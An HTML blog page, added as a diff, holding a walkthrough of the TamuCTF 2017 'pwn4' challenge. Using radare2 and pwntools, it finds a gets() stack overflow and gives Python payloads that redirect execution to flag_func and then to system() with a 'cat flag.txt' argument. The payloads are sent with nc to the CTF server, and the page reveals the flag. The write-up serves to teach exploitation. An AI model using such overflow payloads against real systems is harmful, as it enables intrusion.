@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="generator" content="Hugo 0.26-DEV" />
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="My thoughts and rambles">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <link rel="icon" type="image/png" href="/images/favicon.ico">
+
+    
+    <meta name="mobile-web-app-capable" content="yes">
+    <link rel="icon" sizes="192x192" href="/images/touch/chrome-touch-icon-192x192.png">
+
+    
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="Material Design Lite">
+    <link rel="apple-touch-icon-precomposed" href="apple-touch-icon-precomposed.png">
+
+    
+    <meta name="msapplication-TileImage" content="images/touch/ms-touch-icon-144x144-precomposed.png">
+    <meta name="msapplication-TileColor" content="#3372DF">
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en"/>
+    <link rel="stylesheet" href="/css/ionicons.min.css"/>
+    <link rel="stylesheet" href="https://storage.googleapis.com/code.getmdl.io/1.1.3/material.grey-orange.min.css"/>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <link rel="stylesheet" href="/css/hmdl-style.css"/>
+
+
+
+    <title></title>
+</head>
+
+<body style="background-image: url('/images/background.jpg');">
+    <div id="MainCnt" class="hmdl-body mdl-layout mdl-js-layout has-drawer is-upgraded">        
+        <header class="mdl-layout__header mdl-layout__header--transparent mdl-layout__header--scroll">
+            <div class="mdl-layout__header-row">
+                <div class="mdl-layout-spacer"></div>
+                <nav class="mdl-navigation">
+                <a class="mdl-navigation__link" href="/">Home</a>
+                <a class="mdl-navigation__link" href="/post/">Articles</a>
+                <a class="mdl-navigation__link" href="/project/">Projects</a>
+                <a class="mdl-navigation__link" href="/about/">About</a>
+                </nav>
+            </div>
+        </header>
+        <div class="mdl-layout__drawer">
+            <nav class="mdl-navigation">
+            <a class="mdl-navigation__link" href="/">Home</a>
+            <a class="mdl-navigation__link" href="/post/">Articles</a>
+            <a class="mdl-navigation__link" href="/project/">Projects</a>
+            <a class="mdl-navigation__link" href="/about/">About</a>
+            </nav>
+        </div>
+
+        <main class="mdl-layout__content">
+
+		
+
+            <div class="hmdl-page mdl-grid">
+                <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+                    <div class="mdl-card__media mdl-color-text--grey-50" style=" ">
+                        <h3 ></h3>
+                    </div>
+                    <div class="hmdl-page-meta mdl-color-text--grey-700 mdl-card__supporting-text">
+
+                        <div>
+							<strong>
+							</strong>
+                            <span>Jan 1, 0001</span>
+                        </div>
+                        <div class="section-spacer"></div>
+                    </div>
+                    <div class="hmdl-page-content mdl-color-text--grey-700 mdl-card__supporting-text">
+                        
+
+<h1 id="tamuctf-2017-https-ctf-tamu-edu"><a href="https://ctf.tamu.edu/">TamuCTF 2017</a></h1>
+
+<h3 id="pwn4-200-points">pwn4 - 200 Points</h3>
+
+<p><img src="assets/1-pwn4_description.png" alt="Pwn4 challenge description" /></p>
+
+<p>Is curious that this specific challenge is more worthy than the previous one (<a href="../pwn3/pwn3.md">pwn3</a>). As we will see it is way easier.</p>
+
+<p>Lets take a look to the code with r2</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ r2 pwn4 -c <span style="color: #e6db74">&#39;aaa; afl&#39;</span>
+</pre></div>
+
+<p><img src="assets/2-pwn4_functions.png" alt="Pwn4 functions" /></p>
+
+<p>We can see four interesting functions:</p>
+
+<ul>
+<li><strong><code>sym.flag_func()</code></strong> at <code>0x080484cb</code></li>
+<li><strong><code>sym.func2()</code></strong> at <code>0x080484e4</code></li>
+<li><strong><code>sym.func1()</code></strong> at <code>0x080484fd</code></li>
+<li><strong><code>sym.main()</code></strong> at <code>0x08048515</code></li>
+</ul>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span><span style="color: #f92672">[</span>0x080483d0<span style="color: #f92672">]</span>&gt; s sym.flag_func<span style="color: #f8f8f2">;</span> V<span style="color: #f8f8f2">;</span> p<span style="color: #f8f8f2">;</span> p
+<span style="color: #75715e"># be positioned at start of sym.flag_func; Change to Visual mode; change mode view*2</span>
+</pre></div>
+
+<p>Here they are, take a look at them.</p>
+
+<p><img src="assets/3-pwn4_functions_code.png" alt="Pwn4 functions code" /></p>
+
+<p>Obviously we should try to execute that <strong><code>sym.flag_func()</code></strong>, it seems it will try print a file (<strong>flag2.txt</strong>, strange name right? why 2?) using the <code>cat</code> command on the remote server. But that function is never called. You can check it on your own with:</p>
+
+<pre><code>[0x080484f7]&gt; axt sym.flag_func
+</code></pre>
+
+<p>Then we need to keep looking a bit more.</p>
+
+<ol>
+<li><del><strong><code>sym.func2()</code></strong></del> is just printing a message (it even tells you not to waste your time with it). So we can strikethrough.</li>
+<li><strong><code>sym.func1()</code></strong> is a bit more interesting because it is using the unsecure function <strong><code>gets()</code></strong>.<br />
+Thanks to this function we would be able to overwrite the <strong><code>$eip</code></strong> register. We dont need to cross our fingers a lot of time because we fastly see that <strong><code>sym.func1()</code></strong> is being called from <strong><code>main()</code></strong>! yay!</li>
+</ol>
+
+<p>Lets figure out, how many bytes do we need to overwrite <strong><code>$eip</code></strong> register.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span><span style="color: #f92672">[</span>0x080484f7<span style="color: #f92672">]</span>&gt; q <span style="color: #75715e"># Close r2 (we need to open the binary again with debug mode).</span>
+$ pwn cyclic <span style="color: #ae81ff">40</span> <span style="color: #75715e"># To generate string with unique subsequences.</span>
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa
+$ r2 -X <span style="color: #e6db74">&quot;stdin=\&quot;`pwn cyclic 40`\&quot;&quot;</span> -d pwn4 -c <span style="color: #e6db74">&#39;aaa; dc;&#39;</span>
+.
+.
+<span style="color: #f92672">[</span>0x61616165<span style="color: #f92672">]</span>&gt; q
+$ pwn cyclic -l 0x61616165
+<span style="color: #ae81ff">16</span>
+</pre></div>
+
+<p>So, we can overwrite the <strong><code>$eip</code></strong> register writing the next following 4 bytes (from byte 17 to 20)!<br />
+Now we create a file with the previously commented file (<strong><code>flag2.txt</code></strong>) to try this out.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ <span style="color: #f8f8f2">echo</span> This is the flag &gt; flag2.txt
+$ python -c <span style="color: #e6db74">&#39;print(&quot;A&quot;*16 + &quot;\xcb\x84\x04\x08&quot;)&#39;</span> <span style="color: #f8f8f2">|</span> ./pwn4
+</pre></div>
+
+<p><img src="assets/4-pwn4_printing_flag2.png" alt="Pwn4 printing flag2.txt" /></p>
+
+<p>Good! what will the remote server say?</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;A&quot;*16 + &quot;\xcb\x84\x04\x08&quot;)&#39;</span> <span style="color: #f8f8f2">|</span> nc pwn.ctf.tamu.edu <span style="color: #ae81ff">4324</span>
+</pre></div>
+
+<p><img src="assets/5-pwn4_remote_flag2_content.png" alt="Pwn4 printing flag2.txt" /></p>
+
+<p>Ouch! that file was just a decoy. There must be a file named <strong><code>flag.txt</code></strong>.
+&gt; But how could we executed it? There is only one function which print a file and its name is hardcoded.</p>
+
+<p>Well, that is not a problem, because there is a call to <strong><code>system()</code></strong>.
+The only thing we need to do is to pass a different argument: <strong><code>cat flag.txt</code></strong> instead of <strong><code>cat flag2.txt</code></strong>.</p>
+
+<p>If you inspect all the strings of the binary you may find surprise:
+<img src="assets/6-pwn4_pointer_flag_file.png" alt="Pwn4 printing flag2.txt" />:</p>
+
+<p>As you may know, in order to pass the arguments to the function they need to be pushed into the stack. In case of a string not its value but its reference (a pointer <strong><code>0x0804a028</code></strong>.</p>
+
+<p>Because we can overwrite the stack we can &ldquo;imitate&rdquo; a push into it:
+1. Instead of starting in the address of <strong><code>sym.flag_func()</code></strong> (<strong><code>0x080484cb</code></strong>) we will use <strong><code>system()</code></strong> one (<strong><code>0x080484d9</code></strong>).
+    <code>bash
+    $ python -c 'print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot;)'
+</code>
+2. We need to push the pointer to the string to indicate <strong><code>system()</code></strong> which is its argument.
+    <code>bash
+    $ python -c 'print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot; + &quot;\x28\xa0\x04\x08&quot;)'
+</code></p>
+
+<p>Lets send to the server:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot; + &quot;\x28\xa0\x04\x08&quot;)&#39;</span> <span style="color: #f8f8f2">|</span> nc pwn.ctf.tamu.edu <span style="color: #ae81ff">4324</span>
+</pre></div>
+
+<p><img src="assets/7-pwn4_answer.png" alt="Pwn4 printing flag2.txt" />
+Answer: gigem{R3TURN_0R13NT3D_PR0F1T}</p>
+
+<h3 id="complete-video">Complete video</h3>
+
+<p><a href="https://asciinema.org/a/drr8rhjxvoqpmu6ke8czn6hwf?autoplay=1" target="_blank"><img src="https://asciinema.org/a/drr8rhjxvoqpmu6ke8czn6hwf.png" /></a></p>
+
+<h3 id="tools-used-and-some-references">Tools used and some references:</h3>
+
+<ul>
+<li><a href="https://github.com/radare/radare2">radare2</a> - To analyze the binary.</li>
+<li><a href="https://github.com/Gallopsled/pwntools">pwntools</a> and <a href="http://docs.pwntools.com/en/stable/util/cyclic.html#pwnlib.util.cyclic.cyclic">cyclic</a> - To generate unique substrings.</li>
+<li><a href="https://asciinema.org">asciinema</a> - To record the session.</li>
+</ul>
+
+                    </div>
+                    <div class="hmdl-page-comments mdl-color-text--primary-contrast mdl-card__supporting-text comments"> 
+                        <strong>
+						</strong>
+                        <p></p>
+                    </div>  
+                </div>                
+                <nav class="mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+                    <div class="section-spacer"></div>
+                    <a href="/post/tamuctf2017/pwn1/">
+                        Newer
+                        <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                            <i class="icon ion-android-arrow-forward"></i>
+                        </button>
+                    </a>
+                </nav>
+ 
+            </div>        
+        </main>
+        <footer class="mdl-mini-footer">
+            <div class="mdl-mini-footer--left-section">                
+                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="mailto:Firstname@example.com?subject=Hi">
+                    <i class="material-icons_lg icon ion-email"></i>
+                    <span class="visuallyhidden">Email</span>
+                </a>
+                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="https://github.com/BlackHoods">
+                    <i class="material-icons_lg icon ion-social-github"></i>
+                    <span class="visuallyhidden">Github</span>
+                </a>
+                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="https://twitter.com/firstname_lastname">
+                    <i class="material-icons_lg icon ion-social-twitter "></i>
+                    <span class="visuallyhidden">Twitter</span>
+                </a>
+
+
+            </div>
+            <div class="mdl-mini-footer--right-section">
+                <span>© 2017 </span>
+            </div>
+        </footer>
+        <div class="mdl-layout__obfuscator"></div>
+    </div>
+    <script src="https://code.getmdl.io/1.1.3/material.min.js"></script>
+
+
+</body>
+</html>
+
